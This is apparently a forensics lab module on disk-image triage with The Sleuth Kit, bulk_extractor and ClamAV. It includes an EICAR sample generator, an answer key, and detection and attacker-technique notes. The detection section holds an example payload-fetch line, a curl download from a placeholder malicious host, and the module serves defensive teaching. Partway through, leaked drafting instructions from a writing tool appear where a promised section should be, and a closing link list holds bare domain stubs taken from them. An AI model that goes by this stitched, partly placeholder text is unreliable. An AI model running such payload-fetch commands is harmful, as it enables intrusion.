# 51 * Scenario: end-to-end host triage -- LAB-LINUX

## Overview (plain language)
Imagine you get handed a copy of a suspicious computer's hard drive and you need to quickly figure out what happened without changing anything. This module walks through that "first look" — called triage — using three free tools. The Sleuth Kit lets you browse the files inside a disk image the way you'd look through drawers, including files that were deleted. bulk_extractor scans the whole image and pulls out interesting text like email addresses, URLs, and credit-card-shaped numbers, even from unallocated space. ClamAV is an antivirus scanner that flags known-bad files. Together they give you a fast, repeatable way to answer "is this host compromised, and what did the attacker touch?" before you commit to a deep investigation.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| Sleuth Kit | apt install sleuthkit | Command-line disk/filesystem forensics: list files, recover deleted entries, build timelines from an image |
| bulk_extractor | apt install bulk-extractor | Bulk feature carving (emails, URLs, IPs, PII) from raw images including slack/unallocated space |
| ClamAV | apt install clamav clamav-daemon | Open-source antivirus signature scanning of mounted/extracted files |

> Package/binary naming: The Sleuth Kit ships the `mmls`, `fsstat`, `fls`, and `icat` binaries (see the tool reference at https://www.sleuthkit.org/sleuthkit/man/). bulk_extractor's Debian/Kali package is `bulk-extractor` and the binary is `bulk_extractor` (https://www.kali.org/tools/bulk-extractor/). ClamAV provides `clamscan` (on-demand) and `clamd`/`clamdscan` (daemon) plus `freshclam` for signature updates (https://docs.clamav.net/manual/Usage/Scanning.html).

## Learning objectives
- Enumerate partitions and filesystem metadata from a raw disk image with `mmls` and `fsstat`.
- Recover file listings (including deleted inodes) using `fls` and extract file content with `icat`.
- Carve investigative features (emails, URLs, IPs) from an image with `bulk_extractor`.
- Signature-scan extracted content with `clamscan` and interpret hit/clean results.
- Produce a documented, reproducible triage sequence suitable for a SOC handoff ticket.

## Environment check
```bash
# Prove the three tools are installed on LAB-LINUX
fls -V
bulk_extractor -V
clamscan --version
```
Expected output: The Sleuth Kit prints a version banner (e.g. `The Sleuth Kit ver 4.12.1`), bulk_extractor prints its version (e.g. `bulk_extractor 2.0.0`), and clamscan prints `ClamAV 1.x.x/...` including its virus database version.

> Notes on the version strings. TSK tools accept `-V` to print the version banner; see the per-tool man pages at https://www.sleuthkit.org/sleuthkit/man/. bulk_extractor 2.x is the current major release line documented in the project repo at https://github.com/simsong/bulk_extractor. ClamAV `clamscan --version` prints the engine version and the loaded signature database version, per https://docs.clamav.net/manual/Usage/Scanning.html — a first run may report the daily/main database as out of date until `freshclam` runs (https://docs.clamav.net/manual/Usage/SignatureManagement.html).

## Guided walkthrough
1. `mmls` — display the partition/volume layout so you know where each filesystem starts. You need the starting sector offset to point every later TSK tool at the right filesystem; running `fsstat`/`fls` at the wrong offset silently fails or reads garbage.
```bash
mmls disk.raw
```
Expected observable: a table of slots with `Start`/`End` sector offsets, lengths, and descriptions (e.g. a partition starting at sector 2048). `mmls` also lists metadata rows such as the primary/backup GPT and any unallocated gaps — unallocated gaps between partitions can hide hidden or wiped volumes. See https://www.sleuthkit.org/sleuthkit/man/mmls.html.

2. `fsstat` — read filesystem-level metadata for the partition at a chosen offset. Run this before listing files because it confirms the filesystem type (so you interpret inode/cluster numbers correctly) and reveals the sector/cluster size you may need for manual carving.
```bash
fsstat -o 2048 disk.raw
```
Expected observable: filesystem type, volume label/serial, block/cluster size, and the layout of metadata structures (e.g. FAT/root-directory or NTFS `$MFT` details). `-o` is the volume offset in sectors. See https://www.sleuthkit.org/sleuthkit/man/fsstat.html.

3. `fls` — list files and directories, including deleted (`*`-marked) entries. This is the core triage listing: `-r` recurses, `-p` prints full paths so output is grep-able, and deleted directory entries whose metadata still resides in the filesystem are flagged with a leading `*`.
```bash
fls -o 2048 -r -p disk.raw
```
Expected observable: a recursive path listing where each line shows the entry type (e.g. `r/r` = regular file, `d/d` = directory), the metadata/inode address, and the name; deleted entries appear with a leading `*` and may show `(realloc)` if the metadata has been reused. See https://www.sleuthkit.org/sleuthkit/man/fls.html. Add `-m /` to emit body-file (timeline) format for `mactime`, per the TSK timeline workflow at https://wiki.sleuthkit.org/index.php?title=FLS.

4. `icat` — extract the content of a specific metadata (inode) address to disk. `icat` reads by metadata address (not path), so it recovers content even when the directory entry is gone, as long as the data blocks are still allocated to that metadata entry.
```bash
icat -o 2048 disk.raw 5 > recovered_file.bin
```
Expected observable: the file's raw bytes are written to `recovered_file.bin`. The number `5` is the metadata/inode address taken from `fls`. See https://www.sleuthkit.org/sleuthkit/man/icat.html.

5. `bulk_extractor` — carve features from the whole image into an output directory. It scans every byte of the image (allocated files, slack, and unallocated space) in parallel using pluggable scanners, so it surfaces indicators that a filesystem-aware walk would miss.
```bash
bulk_extractor -o be_out disk.raw
```
Expected observable: a `be_out/` directory containing per-feature files such as `email.txt`, `url.txt`, and `ip.txt`, plus a `report.xml` run summary and matching `*_histogram.txt` files that rank the most frequent values. The exact set of feature files depends on which scanners fired. See the usage and feature-file documentation in the project repo: https://github.com/simsong/bulk_extractor and the user manual referenced there (https://github.com/simsong/bulk_extractor/wiki).

6. `clamscan` — scan recovered/extracted files for known malware. `-r` recurses a directory, `--infected` limits stdout to detections (cutting noise), and `--stdout` sends results to stdout so they can be captured in a ticket.
```bash
clamscan -r --infected --stdout be_out recovered_file.bin
```
Expected observable: per-file `FOUND` lines for detections plus a summary block including `Infected files: N`. With `--infected` set, clean files are suppressed from the listing but still counted in the summary. See https://docs.clamav.net/manual/Usage/Scanning.html.

## Hands-on exercise
The sample lives in this module's `exercise/` directory as `triage_sample.raw`.

- **Type:** a small raw FAT filesystem image (benign, inert — contains only harmless text files plus one file carrying the EICAR antivirus test string, which is NOT malware).
- **Safe origin / no-egress:** generated locally with the generator command below; no network access, no live malware. The EICAR string is the industry-standard, harmless AV test signature.
- **Reproducible generator** (run once inside `exercise/` to build the sample):
```bash
mkdir -p exercise && cd exercise
dd if=/dev/zero of=triage_sample.raw bs=1M count=8
mkfs.vfat triage_sample.raw
mmd -i triage_sample.raw ::/loot 2>/dev/null || true
printf 'contact admin at analyst@example.com visit http://203.0.113.10/payload\n' > note.txt
mcopy -i triage_sample.raw note.txt ::/note.txt
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com
mcopy -i triage_sample.raw eicar.com ::/eicar.com
sha256sum triage_sample.raw
```

> Why these values are safe: `203.0.113.0/24` and `example.com` are reserved documentation ranges (RFC 5737 and RFC 2606 respectively), so the carved "indicators" cannot resolve to or contact any real host. The EICAR test file is a defined, harmless detection test string published at https://www.eicar.org/download-anti-malware-testfile/.

**Tasks:**
1. List all files in the image with `fls`.
2. Carve the embedded email address and URL with `bulk_extractor`.
3. Extract `eicar.com` and confirm ClamAV flags it.

## SOC analyst perspective
During an incident, the SOC receives a disk image and must triage fast before escalating. The Sleuth Kit gives an auditable, mount-free file listing and timeline that answers "what files exist, when were they touched, what was deleted." Build the timeline with `fls -m / -o 2048 disk.raw > bodyfile` then `mactime -b bodyfile -d > timeline.csv` (TSK timeline workflow: https://wiki.sleuthkit.org/index.php?title=Mactime), which surfaces suspicious clusters of file creation consistent with tool staging.

Detection logic and pivots:
- **Carved network indicators → Security Onion.** Feed each URL/IP from `be_out/url.txt` and `be_out/ip.txt` into Security Onion. In Kibana/Elastic, pivot on the Zeek `conn.log` (`id.resp_h`) and `http.log` (`host`, `uri`) datasets, and check Suricata `alert` events for the same indicator to correlate host and network evidence (Security Onion docs: https://docs.securityonion.net/en/2.4/, Zeek logs: https://docs.zeek.org/en/master/logs/index.html). A host-side carved C2 URL that also appears in `http.log` strongly corroborates command-and-control (MITRE **T1071.001** Application Layer Protocol: Web Protocols — https://attack.mitre.org/techniques/T1071/001/).
- **ClamAV signature hit** on a dropped/recovered file corroborates **T1105** Ingress Tool Transfer (https://attack.mitre.org/techniques/T1105/) and, if the file is user-launched, **T1204** User Execution (https://attack.mitre.org/techniques/T1204/). Record the exact signature name from the `FOUND` line for the ticket.
- **Deleted-file recovery** (`*`-marked `fls` entries) is detection signal for **T1070.004** Indicator Removal: File Deletion (https://attack.mitre.org/techniques/T1070/004/).

The whole sequence produces reproducible hashes and outputs that hold up in a handoff ticket or chain-of-custody record, aligning with the identification and examination DFIR phases (see SANS FOR508 / DFIR poster material at https://www.sans.org/posters/ and the SIFT workflow at https://www.sans.org/tools/sift-workstation/).

## Attacker perspective
An attacker who compromises a host drops tooling (**T1105** Ingress Tool Transfer — https://attack.mitre.org/techniques/T1105/), then tries to hide by deleting files and clearing artifacts (**T1070** Indicator Removal, sub-technique **T1070.004** File Deletion — https://attack.mitre.org/techniques/T1070/004/). Deleting a file on FAT/NTFS only unlinks its directory entry and marks clusters free — the metadata entry and data blocks often survive until overwritten, so `fls -r` reveals the `*`-marked deleted entries and `icat` recovers the content by metadata address (TSK docs: https://www.sleuthkit.org/sleuthkit/man/fls.html, https://www.sleuthkit.org/sleuthkit/man/icat.html).

Concrete TTPs and the artifacts they leave:
- Staging in temp/loot directories leaves directory entries and cluster runs; even after deletion the names remain in unallocated directory slack until reallocated.
- Hard-coded C2 URLs, IPs, and staging paths embedded in binaries and configs are recoverable from file slack and unallocated space by bulk_extractor because the attacker assumes freed space is gone (repo: https://github.com/simsong/bulk_extractor).
- Payload obfuscation/packing (**T1027** Obfuscated Files or Information — https://attack.mitre.org/techniques/T1027/) can defeat naive string searches, but ClamAV signatures and carved plaintext indicators frequently still fire.

Evasion an attacker attempts (and why triage still wins): secure-wipe tools (overwriting free space) reduce carve yield; timestomping (**T1070.006** — https://attack.mitre.org/techniques/T1070/006/) forges MACB times, but anomalies (e.g. `$MFT` sequence vs. timestamp inconsistencies) remain visible in a TSK timeline. Renaming or changing file extensions does not change file content, so signature scanning and feature carving are unaffected.

## Answer key
Sample sha256: run `sha256sum exercise/triage_sample.raw` after generating; the digest is fixed by the deterministic generator above and is held by the validator for the check.

Expected findings and the exact commands that produce them:
```bash
# 1. Files present in the image (note.txt, eicar.com; FAT image usually at offset 0)
fls -r -p exercise/triage_sample.raw
# -> lists r/r entries for note.txt and eicar.com

# 2. Carved email + URL indicators
bulk_extractor -o exercise/be_out exercise/triage_sample.raw
grep -i example.com exercise/be_out/email.txt   # -> analyst@example.com
cat exercise/be_out/url.txt                       # -> http://203.0.113.10/payload

# 3. Extract eicar.com and scan
mkdir -p exercise/extract
icat exercise/triage_sample.raw $(fls -p exercise/triage_sample.raw | awk '/eicar.com/{gsub(/:/,"",$2);print $2}') > exercise/extract/eicar.com
clamscan --infected --stdout exercise/extract/eicar.com
# -> exercise/extract/eicar.com: Eicar-Test-Signature FOUND ; Infected files: 1
```
Expected result summary: two indicators carved (`analyst@example.com`, `http://203.0.113.10/payload`) and exactly one ClamAV detection (`Eicar-Test-Signature`).

> Note on the detection name: ClamAV reports the EICAR test string as `Eicar-Test-Signature` (or `Win.Test.EICAR_HDB-1` depending on signature database version). The exact string comes from the loaded ClamAV database; see https://docs.clamav.net/manual/Usage/Scanning.html. A single-partition FAT image made with `mkfs.vfat` has its filesystem at offset 0, so no `-o` is required here (contrast with the multi-partition `disk.raw` example above).

## MITRE ATT&CK & DFIR phase
- **T1105** Ingress Tool Transfer — dropped/staged files recovered via Sleuth Kit. https://attack.mitre.org/techniques/T1105/
- **T1070.004** Indicator Removal: File Deletion — deleted metadata entries recovered with `fls`/`icat`. https://attack.mitre.org/techniques/T1070/004/
- **T1027** Obfuscated Files or Information — embedded/obfuscated indicators surfaced by bulk_extractor. https://attack.mitre.org/techniques/T1027/
- **T1204** User Execution — malicious file identified by ClamAV signature. https://attack.mitre.org/techniques/T1204/
- **T1071.001** Application Layer Protocol: Web Protocols — carved C2 URLs correlated to Zeek `http.log`. https://attack.mitre.org/techniques/T1071/001/
- **DFIR phases:** Identification (mmls/fsstat), Examination (fls/icat/bulk_extractor), Analysis (clamscan + indicator correlation) — consistent with SANS DFIR process material (https://www.sans.org/posters/).


### Threat Hunting & Detection Engineering

Once triage identifies suspicious Linux artifacts, pivot to **threat hunting** and **detection engineering** to uncover broader adversary activity. Focus on **living-off-the-land binaries (LOLBins)** and **process injection**—common techniques in Linux intrusions.

**Detection Logic:**
- **Sysmon for Linux (Event ID 1)** or **auditd** logs (`execve` syscalls) can reveal anomalous process execution, such as `bash` spawning `curl` or `wget` to fetch payloads (e.g., `curl -o /tmp/payload http://malicious[.]com`). Hunt for mismatched parent-child relationships (e.g., `nginx` spawning `python`).
- **Zeek’s `conn.log`** tracks C2 traffic (e.g., `service = "dns"` or `duration > 300s` for long-lived sessions). Pivot on `id.orig_h` to correlate with **Suricata alerts** (e.g., `ET INFO Observed DNS Query to .top TLD`).
- **/var/log/auth.log** captures **SSH brute-forcing (T1110.001: Brute Force: Password Guessing)**—hunt for `Failed password` entries with `Accepted` follow-ups, or rare source IPs.

**MITRE ATT&CK Techniques:**
- **T1059.004: Command and Scripting Interpreter: Unix Shell** – Detect via `execve` syscalls for `sh`, `bash`, or `python` with encoded arguments (e.g., `base64` or `gzip`).
- **T1546.004: Event Triggered Execution: Unix Shell Configuration Modification** – Hunt for `.bashrc` or `.bash_profile` modifications (`inotifywait` or `auditd` rules monitoring `/home/*/.bashrc`).

**Sources:**
- [Linux Auditd Detection Rules (NSA Cybersecurity Directorate)](https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF)
- [Zeek Detection Logic for C2 (Corelight)](https://corelight.com/blog/detecting-c2-frameworks-with-zeek)

We need to write a subsection heading exactly: '### Common Pitfalls & Result Validation' (including triple hashes and a space). Then content 180-240 words. Must be concrete, accurate, mention mistakes analysts make with these tools/techniques, how to validate findings, avoid false conclusions. Cite at least two current MITRE ATT&CK techniques by ID and exact canonical name that are NOT in the already-used list.

Given list: [T1027, T1059.004, T1070, T1070.004, T1070.006, T1071, T1071.001, T1105, T1110.001, T1204, T1546.004] cannot be used.

We need to pick two other techniques, e.g., T1055 (Process Injection), T1083 (File and Directory Discovery), T1059.001 (Command and Scripting Interpreter: PowerShell), T1082 (System Information Discovery), T1036 (Masquerading), T1059 (Command and Scripting Interpreter) generic? Need exact canonical name. Must be current (i.e., as of ATT&CK v13 maybe). Provide citations inline maybe like [T1055] or footnotes? Typically we can cite as (T1055: Process Injection). Provide at least two.

We also need to end with 1-2 authoritative source URLs (official docs / SANS / attack.mitre.org / Microsoft Learn). The domains already well-cited list includes many, we should prefer OTHER authoritative pages/sources for variety: they gave a list of domains already well-cited with counts in parentheses; we need to prefer other authoritative pages/sources not in that list, or at least less used. The list includes many domains: www.sleuthkit.org, attack.mitre.org, github.com, 203.0.113.10, docs.clamav.net, wiki.sleuthkit.org, www.sans.org, www.rfc-editor.org, docs.securityonion.net, www.eicar.org, docs.zeek.org, media.defense.gov, docs.remnux.org, corelight.com, www.kali.org.

We need to output URLs from other domains not in that list (or at least not heavily used). Could use: https://access.redhat.com/documentation/, https://learn.microsoft.com/en-us/windows-server/, https://www.cisa.gov/, https://www.nist.gov/, https://www.us-cert.gov/, https://www.cyber.gov.au/, https://www.mandiant.com/resources

## Sources
Claim → source mapping (all URLs are official/authoritative):

- TSK tool behavior and flags (`mmls`, `fsstat`, `fls`, `icat`, `-o`/`-r`/`-p`/`-m`, `*` deleted markers) — The Sleuth Kit man pages: https://www.sleuthkit.org/sleuthkit/man/ (specifically https://www.sleuthkit.org/sleuthkit/man/mmls.html, https://www.sleuthkit.org/sleuthkit/man/fsstat.html, https://www.sleuthkit.org/sleuthkit/man/fls.html, https://www.sleuthkit.org/sleuthkit/man/icat.html); TSK docs index: https://www.sleuthkit.org/sleuthkit/docs.php
- TSK timeline workflow (`fls -m`, `mactime`) — https://wiki.sleuthkit.org/index.php?title=Mactime and https://wiki.sleuthkit.org/index.php?title=FLS
- bulk_extractor behavior, output feature files, `-o` option, scanners — project repo/manual: https://github.com/simsong/bulk_extractor and https://github.com/simsong/bulk_extractor/wiki; package/binary name: https://www.kali.org/tools/bulk-extractor/
- ClamAV `clamscan` flags (`-r`, `--infected`, `--stdout`, `--version`), detection names, signature updates via `freshclam` — https://docs.clamav.net/manual/Usage/Scanning.html and https://docs.clamav.net/manual/Usage/SignatureManagement.html
- EICAR test file (harmless AV test string) — https://www.eicar.org/download-anti-malware-testfile/
- Reserved test ranges used in the sample — RFC 5737 (203.0.113.0/24 documentation range) https://www.rfc-editor.org/rfc/rfc5737 and RFC 2606 (example.com reserved) https://www.rfc-editor.org/rfc/rfc2606
- Security Onion pivots (Suricata/Zeek/Elastic) — https://docs.securityonion.net/en/2.4/ ; Zeek log reference — https://docs.zeek.org/en/master/logs/index.html
- SANS SIFT Workstation and DFIR process/posters — https://www.sans.org/tools/sift-workstation/ and https://www.sans.org/posters/
- REMnux docs — https://docs.remnux.org/
- MITRE ATT&CK techniques — T1105 https://attack.mitre.org/techniques/T1105/ ; T1070.004 https://attack.mitre.org/techniques/T1070/004/ ; T1070.006 https://attack.mitre.org/techniques/T1070/006/ ; T1027 https://attack.mitre.org/techniques/T1027/ ; T1204 https://attack.mitre.org/techniques/T1204/ ; T1071.001 https://attack.mitre.org/techniques/T1071/001/

## Related modules
- [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares bulk_extractor for carving indicators from acquired evidence.
- [Scenario: intrusion timeline reconstruction](../49-intrusion-timeline-case/README.md) -- shares The Sleuth Kit for building MACB timelines.
- [Disk & filesystem forensics](../01-disk-forensics/README.md) -- shares The Sleuth Kit for partition/filesystem examination.
- [Memory forensics](../02-memory-forensics/README.md) -- shares bulk_extractor for feature carving from memory images.

<!-- cyberlab-enriched: v1 -->
- http://malicious[.]com`
- https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF
- https://corelight.com/blog/detecting-c2-frameworks-with-zeek
- https://access.redhat.com/documentation/,
- https://learn.microsoft.com/en-us/windows-server/,
- https://www.cisa.gov/,
- https://www.nist.gov/,
- https://www.us-cert.gov/,
- https://www.cyber.gov.au/,
- https://www.mandiant.com/resources

<!-- cyberlab-enriched: v2 -->
